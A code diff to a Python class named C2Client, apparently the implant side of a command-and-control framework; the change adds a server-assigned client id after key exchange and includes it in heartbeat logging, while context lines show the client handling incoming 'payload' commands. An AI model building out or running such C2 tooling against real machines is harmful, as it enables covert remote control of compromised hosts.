@@ -23,6 +23,7 @@ class C2Client:
         self.interval = interval
         self.socket = None
         self.connected = False
+        self.client_id = None
         self.symmetric_key = None
         self.hmac_key = None
         self.cipher_suite = None
@@ -101,6 +102,18 @@ class C2Client:
             exchange_result = self.socket.recv(1024)
             if exchange_result != b'KEY_EXCHANGE_COMPLETE':
                 raise ValueError("Key exchange failed")
+
+            # Receive client id if provided
+            try:
+                client_id_len_raw = self.socket.recv(4)
+                if len(client_id_len_raw) == 4:
+                    client_id_len = int.from_bytes(client_id_len_raw, "big")
+                    client_id_bytes = self.socket.recv(client_id_len)
+                    if len(client_id_bytes) == client_id_len:
+                        self.client_id = client_id_bytes.decode()
+                        self.logger.info(f"Assigned client id: {self.client_id}")
+            except Exception:
+                self.client_id = None
             
             self.logger.info("Successful key exchange")
             
@@ -260,7 +273,7 @@ class C2Client:
             
             if command_type == 'heartbeat':
                 # Just log it if you want to track heartbeats
-                self.logger.debug("Heartbeat received from server")
+                self.logger.debug(f"Heartbeat received from server (client id: {self.client_id or 'unknown'})")
                 return
             
             if command_type == 'initial_payload' or command_type == 'payload':
